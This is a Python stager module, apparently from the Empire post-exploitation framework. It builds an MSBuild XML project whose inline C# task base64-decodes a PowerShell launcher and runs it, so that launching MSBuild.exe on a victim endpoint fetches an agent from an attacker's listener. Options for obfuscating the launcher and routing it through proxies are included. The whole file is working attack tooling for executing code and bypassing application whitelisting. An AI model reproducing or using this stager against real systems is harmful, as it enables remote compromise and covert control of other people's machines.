from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'msbuild_xml',

            'Author': ['@p3nt4'],

            'Description': ('Generates an XML file to be run with MSBuild.exe'),

            'Comments': [
                'On the endpoint simply launch MSBuild.exe payload.xml'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description':   'Listener to generate stager for.',
                'Required':   True,
                'Value':   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries': {
                'Description':   'Times for the stager to retry connecting.',
                'Required':   False,
                'Value':   '0'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
            },
            'OutFile': {
                'Description':   'File to output XML to, otherwise displayed on the screen.',
                'Required':   False,
                'Value':   '/tmp/launcher.xml'
            },
            'UserAgent': {
                'Description':   'User-agent string to use for the staging request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'Proxy': {
                'Description':   'Proxy to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'ProxyCreds': {
                'Description':   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']

        encode = True
            
        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName, language=language, encode=encode, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        launcher_array=launcher.split()
        if len(launcher_array) > 1:
            print helpers.color("[*] Removing Launcher String")
            launcher = launcher_array[-1]

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
                code ="<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">"
                code += "<Target Name=\"EmpireStager\">"
                code += "<ClassExample />"
                code += "</Target>"
                code += "<UsingTask "
                code += "TaskName=\"ClassExample\" "
                code += "TaskFactory=\"CodeTaskFactory\" "
                code += "AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >"
                code += "<Task>"
                code += "<Reference Include=\"System.Management.Automation\" />"
                code += "<Using Namespace=\"System\" />"
                code += "<Using Namespace=\"System.IO\" />"
                code += "<Using Namespace=\"System.Reflection\" />"
                code += "<Using Namespace=\"System.Collections.Generic\" />"
                code += "<Code Type=\"Class\" Language=\"cs\">"
                code += "<![CDATA[ "
                code += "using System;"
                code += "using System.IO;"
                code += "using System.Diagnostics;"
                code += "using System.Reflection;"
                code += "using System.Runtime.InteropServices;"
                code += "using System.Collections.ObjectModel;"
                code += "using System.Management.Automation;"
                code += "using System.Management.Automation.Runspaces;"
                code += "using System.Text;"
                code += "using Microsoft.Build.Framework;"
                code += "using Microsoft.Build.Utilities;"
                code += "public class ClassExample :  Task, ITask"
                code += "{"
                code += "public override bool Execute()"
                code += "{"
                code += "byte[] data = Convert.FromBase64String(\""+launcher+"\");string script = Encoding.Unicode.GetString(data);"
                code += "PSExecute(script);"
                code += "return true;"
                code += "}"
                code += "public static void PSExecute(string cmd)"
                code += "{"
                code += "Runspace runspace = RunspaceFactory.CreateRunspace();"
                code += "runspace.Open();"
                code += "Pipeline pipeline = runspace.CreatePipeline();"
                code += "pipeline.Commands.AddScript(cmd);"
                code += "pipeline.InvokeAsync();"
                code += "}"
                code += "}"
                code += " ]]>"
                code += "</Code>"
                code += "</Task>"
                code += "</UsingTask>"
                code += "</Project>"
        return code
